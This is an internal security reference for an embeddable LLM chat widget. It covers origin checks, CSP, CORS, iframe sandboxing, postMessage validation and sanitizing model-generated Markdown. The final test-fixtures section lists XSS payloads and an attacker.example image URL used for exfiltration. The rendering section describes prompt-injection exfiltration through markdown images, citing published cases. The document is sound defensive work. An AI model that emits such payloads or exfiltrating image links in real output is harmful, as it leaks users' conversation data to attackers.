# Embedded widget and output rendering — reference

Depth for `kb-security-baseline`. Spec: `docs/13-security.md` §18.5 §18.9, `docs/04-functional-channels-chat.md` §8.20.

The widget is a third-party script running on domains we do not control, talking to a bot we do. Two things follow: nothing the host page sends is trustworthy, and every control has to work when the embedder is hostile, not merely careless. Note the direction of the sandbox: **the `sandbox` attribute protects the customer from us, not us from the customer** — a hostile embedder writes their own `<iframe>` tag with whatever attributes they like. Our boundary is cross-origin separation plus `frame-ancestors` plus CSP.

## Hostnames — one spelling, and why it is load-bearing

`traefik-routing` is the authority; every hostname below uses its placeholders. `app.<domain>` (admin console), `chat.<domain>` (hosted chat, a separate origin because it renders model-generated Markdown — the highest-risk XSS sink here — and must not share an origin with the admin session cookie), `api.<domain>` (the Laravel public API, on the **main** registrable domain), and `<widget-domain>` — a **separate eTLD+1** serving only the loader and the widget iframe app.

`<widget-domain>` must share **no registrable suffix** with `app`/`chat`/`api`. The admin session cookie is scoped to the main domain, so putting the API — or anything else of ours — on the widget's registrable domain makes a widget iframe embedded on a hostile customer page *same-site* with a real admin credential; every `SameSite=Lax` protection on the admin surface then applies to requests a stranger's page can cause. CHIPS does not help, because the cookie is not the widget's to partition. So `connect-src` on the iframe names `api.<domain>` while the document itself is served from `<widget-domain>`, and those two strings are deliberately not neighbours (docs/22 defect 17, `laravel-sanctum-auth`).

## Trust model

- **The public bot id is public.** It appears in the loader snippet on every page. It identifies a bot; it authenticates and authorizes nothing.
- **`Origin` is the only host-page fact worth anything.** The browser sets it and page script cannot forge it. `Referer` can be suppressed by the embedder (`referrerpolicy`, `<meta name="referrer">`), so a strict referrer check either fails open or breaks legitimate customers. Anything the loader passes in JS config is attacker-controlled by definition — §8.20: "sensitive configuration must never be accepted directly from untrusted JavaScript."
- **The iframe holds no provider credential, ever.** It holds a short-lived chat session token that can do exactly one thing: send messages to one bot.

## The eight controls (§18.5)

**1. Allowed-origin validation.** Each bot carries an explicit list of **full origins** (`https://app.customer.example`) — never bare hostnames, never regexes. Validate by parsing (`new URL(origin)`) and comparing `.protocol`, `.hostname`, `.port` separately, or by exact string equality against the stored origin. Support at most one wildcard form — a single leading `*.` matched by splitting labels — and never a bare `*`. Note that origins carry no trailing slash, so a `!==` against a slashed constant fails in a way that is easy to "fix" by loosening the comparison.

**2. Short-lived session token.** The loader POSTs the bot id to Laravel; Laravel validates the `Origin` header against the bot's list and returns an opaque token bound to `{bot_id, origin, session_id}`, stored in Valkey with a TTL of minutes. It expires, and **the re-mint path is not a second `init` and not a call the frame can make**: only the loader's POST from the customer's page carries an unforgeable `Origin`. `laravel-sanctum-auth` → `references/widget-session-service.md` § *Refresh* owns that flow end to end — read it there rather than reinventing it here. Opaque, not a JWT carrying claims the client could read or that we would then trust. A missing `Origin` on a cross-origin request is a rejection, not a default-allow. Never `localStorage` — OWASP: *"Never store session identifiers in local storage; use `httpOnly` cookies."*

**3. Signed authenticated-user metadata.** When the customer wants the bot to know who the visitor is, their **backend** signs `{sub, name, email, iat, exp}` with a per-bot shared secret (HMAC-SHA256) and hands the token to the loader. We verify server-side and reject on expiry, clock skew beyond a minute or two, or a wrong key id. Identity claims presented as plain loader config are display data at best and must never reach an authorization decision.

**4. Strict CORS.** Echo `Access-Control-Allow-Origin` only for an origin already on the bot's list — never `*`, never `*` with credentials, and **never `null`** (`Access-Control-Allow-Origin: null` is exploitable from any sandboxed or `data:` frame on the internet). **Always send `Vary: Origin`.** Without it, Traefik or any CDN in front caches the response with one tenant's `Access-Control-Allow-Origin` and serves it to another — which reads as an intermittent, unreproducible CORS failure and is actually a cross-tenant header leak.

**5. Content Security Policy** on the iframe document:

```
default-src 'none';
script-src 'nonce-{RANDOM}' 'strict-dynamic';
style-src 'self' 'nonce-{RANDOM}';
img-src 'self' data:;
connect-src 'self' https://api.<domain> wss://api.<domain>;
font-src 'self';
worker-src 'self';
object-src 'none';
base-uri 'none';
form-action 'none';
frame-src 'none';
frame-ancestors https://validated-embedder.example;
require-trusted-types-for 'script';
```

Start from `'none'`, not `'self'` — `'self'` silently permits `frame-src`, `media-src`, `manifest-src`.

**Nonce plus `'strict-dynamic'`, never a host allow-list.** Weichselbaum, Spagnuolo, Lekies & Janc (*CSP Is Dead, Long Live CSP!*, CCS 2016) measured 26,011 unique real-world policies: **94.72% contained a bypass**, **75.81% of allow-list-based policies were bypassable**, and *"14 out of the 15 domains most commonly allow-listed for loading scripts contain unsafe endpoints"* — a JSONP callback or an old AngularJS build on any allow-listed CDN turns the policy off. `'strict-dynamic'` makes browsers **ignore** host- and scheme-sources in `script-src` and propagate trust cryptographically instead. Generate the nonce fresh per response from a CSPRNG, ≥128 bits, in the templating engine — and never via middleware that stamps a nonce onto every `<script>` tag, because injected scripts get one too.

`object-src 'none'` and `base-uri 'none'` are the two directives people omit and the two that reinstate script execution: `<object>` is a script primitive `script-src` does not cover, and an injected `<base href>` reroutes every relative script URL, defeating `'strict-dynamic'` outright. `form-action` is not covered by `default-src`; set it to `'none'` since a chat widget posts over `fetch`/WebSocket.

**`img-src` and `connect-src` are the exfiltration controls, not styling concerns.** For an ordinary app `img-src` is a nuisance directive; for an LLM widget it is a primary control. Every outbound-request primitive needs constraining — `img-src`, `connect-src`, `style-src` (CSS `url()`), `font-src`, `media-src`, `prefetch-src`, `form-action`. A policy that locks `connect-src` and leaves `img-src https:` has not closed the channel. And CSP **cannot** cover top-level navigation: `navigate-to` was removed from CSP Level 3 and is not implemented, which is why the link-scheme allow-list below is not optional.

**6. `frame-ancestors` derived per request.** It replaces `X-Frame-Options` (and overrides it where both appear), is Baseline since January 2018, and **cannot be set in a `<meta>` tag** — HTTP response header only, which is a hard constraint if the widget is served from a CDN.

There is no safe wildcard for "any customer who has signed up": `*` and `https:` mean literally every site on the internet, and `*.customer.example` grants every subdomain including a dangling-DNS takeover. So generate the header per request — the loader appends the host origin to the iframe URL, the server validates it against that tenant's registered set, and emits `frame-ancestors <that one origin>`, or `'none'` plus a "not authorized for this domain" page. Emit the single matched origin, never the tenant's whole list and never the union across tenants. Mark the framed document `Cache-Control: private, no-store`.

Two operational notes: **every ancestor in the chain is checked**, so a customer embedding the widget inside their own tag-manager or page-builder iframe will be blocked unless that outer frame also matches — plan for it. And `frame-ancestors *` plus an in-app origin check is not equivalent: the in-app check runs *after* the document loads (session minted, rate-limit slot consumed, analytics fired), `document.referrer` can be suppressed so the check fails open or breaks customers, and clickjacking of the widget's own controls remains possible. Acceptable only as a dated, temporary rollout state.

**7. Iframe `sandbox` — and the token that must be present.**

```html
<iframe src="https://<widget-domain>/embed?bot=…&origin=…&ch=…"
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"
        referrerpolicy="strict-origin" title="Support chat"></iframe>
```

**Three query parameters, and all three are load-bearing** (`preact-vite-library`, `iframe-postmessage-bridge` own the spelling). `bot` is the public bot id — public by construction, authorizing nothing. `origin` is the embedder's `location.origin`, attacker-controlled and self-defeating, because the server echoes the *validated* value into `frame-ancestors` on this very response. `ch` is a fresh `crypto.randomUUID()` scoping the postMessage channel to **this** frame instance; the loader and the frame both carry it in every envelope. Omitting `ch` is not a cosmetic difference: every envelope fails the `ch` comparison, the handshake never completes, the frame times out into `degrade()`, and the widget renders a launcher that does nothing at all — no exception, nothing in either console. None of the three is a credential, and the session token never appears here (`laravel-sanctum-auth` NN 4 bars tokens in URLs, fragment included).

Deliberately omitted: `allow-top-navigation` and its variants (a compromised widget must never navigate the customer's page — this is the anti-phishing control), `allow-downloads`, `allow-modals`. `allow-popups-to-escape-sandbox` is required *with* `allow-popups`, or the tab a user opens from a citation link inherits our sandbox and loads into an opaque origin.

**`allow-same-origin` must be present, and the received wisdom about it is scoped more narrowly than people remember.** MDN's warning is conditional: the `allow-scripts` + `allow-same-origin` escape applies *"when the embedded document has the same origin as the embedding page"* — then `window.frameElement` is non-null, the framed script calls `frameElement.removeAttribute('sandbox')` and reloads, and since sandbox flags are applied at browsing-context creation the reloaded document has none. Our widget is served from `<widget-domain>` and framed by `customer.example`, so `frameElement` is `null` and the escape is unavailable.

Omitting the token instead gives the frame an **opaque origin**, and that breaks the product in three specific ways:
- `event.origin` on messages from the widget is the literal string `"null"`, which is indistinguishable from any other opaque context — any sandboxed or `data:` frame anywhere. Allow-listing `"null"` allow-lists everything opaque.
- You cannot target an opaque origin by name, so `postMessage` from the loader is forced to `targetOrigin: "*"` — exactly what must never be done.
- API requests arrive with `Origin: null`, and storage (`localStorage`, cookies, IndexedDB, the Storage Access API) throws or is unavailable.

So ship it — and write the boundary condition into the doctrine: **never place this widget in a same-origin iframe on any page of ours** (demo pages, the admin playground, a customer-hosted proxy), because there the escape is live.

**Storage is partitioned regardless.** Firefox has statically partitioned `localStorage`, `sessionStorage`, IndexedDB, Cache, BroadcastChannel, SharedWorkers and ServiceWorkers by top-level site since Firefox 85/103, and dynamically partitions cookies. Chrome partitions third-party storage by default but **did not deprecate third-party cookies** — Google cancelled that on 2025-04-22 — so an unpartitioned `SameSite=None` cookie still works there and must not be relied on, since users, Incognito, and enterprise policy all block it. Use CHIPS, and for **one value only, a resumption id**: `Set-Cookie: __Host-kbresume=<opaque>; Secure; SameSite=None; Path=/; Partitioned; Max-Age=1800` (Baseline newly available since December 2025), set by our API on the frame's own requests. `iframe-postmessage-bridge` owns this decision and the two fallback tiers behind it (`sessionStorage`, then memory and a fresh conversation). **It is not the session token and carries no authority**: it names a conversation the frame may ask to resume, and it is useless without a live session bearer, which arrives once over the bridge and lives in module scope in the frame, sent as an `Authorization` header. Keep that distinction — a bearer credential parked in partitioned storage is replayable by anything that can read that partition and outlives the tab that earned it, while a resumption id buys an attacker nothing. Its partition key is the **site**, not the origin, so `customer.example` and `app.customer.example` share one continuity context — but `customer-a.example` and `customer-b.example` never will, by design. Any feature premised on one widget identity following a user across customers is not buildable with ambient cookies; it needs `requestStorageAccess()` (with `allow-storage-access-by-user-activation`) or FedCM. <!-- UNVERIFIED: CHIPS size/count/lifetime quotas are not documented on MDN; Safari's exact 2026 ITP behaviour was not re-verified. -->

**8. Rate limiting on all four keys together** — bot, origin, session, IP (§8.20). Each alone fails: IP-only punishes one NAT'd corporate network for one abuser; session-only is defeated by discarding the session; origin-only is defeated by a page on another domain. Layer the abuse-detection hooks and the optional CAPTCHA challenge on the composite counters, not on IP.

## `postMessage`

MDN is unusually direct here: *"If you do not expect to receive messages from other sites, do not add any event listeners for `message` events."* If you do:

```js
const ALLOWED = new Set(["https://app.customer.example"]);   // exact origin strings

window.addEventListener("message", (e) => {
  if (e.source !== window.parent) return;   // right window
  if (!ALLOWED.has(e.origin)) return;       // right origin, exact equality
  if (typeof e.data !== "object" || e.data === null) return;
  handle(e.data);                            // then validate the schema
});
```

**Why `event.source` is not redundant with `event.origin`:** origin tells you which *origin* spoke, not which *window*, and any window in the frame tree can post to any other. If the customer's page also embeds `https://customer.example/ads`, that frame carries the customer's origin, passes an origin-only check, and can drive our message protocol. `event.source` is a `WindowProxy` and cannot be forged — compare with `===`.

**The substring trap.** OWASP's HTML5 cheat sheet calls `if (message.origin.indexOf(".ourdomain.com") != -1)` *"very insecure"*, and the whole family fails the same way: `startsWith` → `https://ourdomain.com.evil.com`; `endsWith` → `https://evilourdomain.com`; an unanchored regex → both. Exact equality on the full origin, or parse and compare components. Never regex.

Sending: always an explicit `targetOrigin`. `'*'` broadcasts to whatever document currently occupies the frame — including one the host page swapped in. Accept only the approved event names from §8.20 with a fixed payload schema, and never pass a received string to `innerHTML`, `eval`, `new Function`, or a URL you then navigate to — OWASP: *"use `element.textContent = data`."*

## Rendering model output (§18.9)

Every rendered token is downstream of retrieved source content, which is attacker-controlled. The renderer is the last boundary, and — per `references/prompt-injection.md` — the only one in the chain that fails closed.

```js
const md = new MarkdownIt({ html: false, linkify: false, breaks: true });

// Never auto-load a model-emitted image. Render a placeholder the user must click.
md.renderer.rules.image = (tokens, idx) =>
  `<span class="md-image-blocked" data-alt="${escapeHtml(tokens[idx].content)}">[image]</span>`;

const clean = DOMPurify.sanitize(md.render(modelOutput), {
  ALLOWED_TAGS: ["p","br","strong","em","del","code","pre","blockquote","ul","ol","li",
                 "a","h1","h2","h3","h4","table","thead","tbody","tr","th","td","hr","span"],
  ALLOWED_ATTR: ["href","title","class"],       // plain arrays only — never the predicate form
  ALLOWED_URI_REGEXP: /^https?:\/\//i,          // scheme allow-list, not a block-list
  ALLOW_DATA_ATTR: false,
  RETURN_DOM_FRAGMENT: true,                    // never re-serialize; see mXSS below
});
container.replaceChildren(clean);               // not innerHTML
```

**`html: false` is the primary control, and it is markdown-it's default.** Its own safety doc: *"Don't enable HTML… Output will be safe without sanitizer."* It also blocks `javascript:`, `vbscript:`, `file:`, and all `data:` except gif/png/jpeg/webp via `validateLink`. **Prefer markdown-it to `marked`** — marked removed its `sanitize` option in v8 and has no equivalent link-scheme filtering, so DOMPurify becomes the *sole* barrier there. If you use a heading-anchor plugin, prefix every generated `id`: unprefixed ids are a DOM-clobbering vector.

**DOMPurify configuration is itself a security decision.** The 2024–2026 advisory record is roughly twenty CVEs, and it clusters:

| Never use | Because |
|---|---|
| `IN_PLACE` mode | Seven distinct 2026 CVEs — cross-realm bypass, clobbered-root attributes, attacker-controlled `nodeName`, shadow roots inside `<template>.content`. Sanitize strings/fragments, not live DOM. |
| Function/predicate forms of `ADD_TAGS` / `ADD_ATTR` | They bypass `FORBID_TAGS` (short-circuit asymmetry) and **skip URI validation entirely** (CVE-2026-65912). |
| `SAFE_FOR_TEMPLATES` as a control | Bypassed three times. |
| `CUSTOM_ELEMENT_HANDLING` | Prototype-pollution and `afterSanitizeElements` bypasses. |
| Mutating config from a hook, or `setConfig()` | Permanently pollutes `ALLOWED_ATTR` / `allowedTags` for every later call. Pass config per `sanitize()` call. |
| `USE_PROFILES` or `FORBID_*` block-lists | Prefer a small explicit allow-list. |

Pin ≥ 3.4.13 and let Renovate auto-merge patch releases — at this advisory rate, keeping it current *is* a control.

**mXSS: sanitize once, insert the node.** Mutation XSS is the class where a string safe as parsed becomes unsafe when re-serialized and re-parsed, because HTML serialization is not the inverse of parsing at foreign-content boundaries (`<svg>`, `<math>`, `<template>`). Round-tripping sanitized output back through a string — `el.innerHTML = DOMPurify.sanitize(x)` then reading `el.innerHTML` and assigning it elsewhere — voids the sanitization. Hence `RETURN_DOM_FRAGMENT` and `replaceChildren`.

**Scheme allow-list, never a block-list.** Blocking `javascript:`/`data:`/`vbscript:` misses `blob:`, `filesystem:`, `about:`, custom protocol handlers, and every case/whitespace/entity variant (`jAvAsCrIpT:`, `java\tscript:`, `java&#x09;script:`, leading NULs). `ALLOWED_URI_REGEXP` is the correct knob.

**External links get `target="_blank"` and `rel="noopener noreferrer nofollow ugc"`,** applied in an `afterSanitizeAttributes` hook. `noopener` stops reverse tabnabbing via `window.opener` (the implicit browser behaviour does not cover `window.open()` or older embedded webviews on customer sites). `noreferrer` is an exfiltration control here: without it a model-emitted link leaks the widget URL — tenant key, conversation id — to the destination in the `Referer`.

**Do not auto-load remote images.** `![](https://attacker/?d=<conversation>)` is a zero-click GET to an attacker-chosen URL with attacker-chosen query parameters. Nothing about it is XSS; a correct sanitizer passes it, because it is a valid non-scripting `<img>`. Johann Rehberger demonstrated it against the Azure OpenAI Playground in 2023 (the model *"correctly URL encoded the data"*); Microsoft's fix was to **stop rendering markdown images**, and the same class recurred as EchoLeak (CVE-2025-32711). Three independent layers, all of them: the renderer rule above, excluding `img` from `ALLOWED_TAGS`, and `img-src 'self' data:` in the CSP — the last being the one that survives a DOMPurify bypass, which you should assume you will need. Apply the same reasoning to links: show the destination host, and consider an interstitial for hosts outside the retrieved set.

**No `<iframe>`, `<object>`, `<embed>`, `<form>`, `<svg>`, or event-handler attributes** survive sanitization. **Citation links come from our source records**, resolved by id from the retrieved set, never from a URL the model typed (`docs/07-rag-query-pipeline.md` §12.16–12.17).

**One renderer, everywhere.** The same path serves the hosted chat page, the admin playground, the conversation-review screens, and the mobile message renderer. An admin reading a stored conversation is reading attacker-controlled text in a session with real privileges — the admin UI must not get a more permissive renderer than the widget.

*The native `Element.setHTML()` / Sanitizer API is the right destination — it unconditionally strips `<script>`, `<iframe>`, `<object>`, `<embed>`, `<use>` and event handlers even when a config allows them — but MDN currently marks it Limited Availability, so it cannot be the only sanitizer for a widget running on arbitrary customer browsers. Feature-detect it as a second pass; revisit as primary later.*

## Test fixtures (§22.5 "CORS and origin enforcement", "XSS in source content")

A test that parses the deployed `<widget-domain>` and each of `app.`/`chat.`/`api.<domain>` and asserts the eTLD+1 differs — the one assertion that catches the collapse before it ships. Session-token request from an unlisted origin; from `https://<allowed>.evil.com`; with no `Origin` header; with `Origin: null`. A cached response asserted to carry `Vary: Origin`. `postMessage` from an unlisted origin, and from a *sibling* frame on an allowed origin (must be rejected by the `event.source` check). A source document containing `<img src=x onerror=alert(1)>`, `[click](javascript:alert(1))`, `[click](java&#x09;script:alert(1))`, `<svg/onload=alert(1)>`, an `<iframe>`, a deeply nested mXSS payload, and `![](https://attacker.example/?d=x)` — asserted to produce no script execution and no outbound request in the rendered DOM.
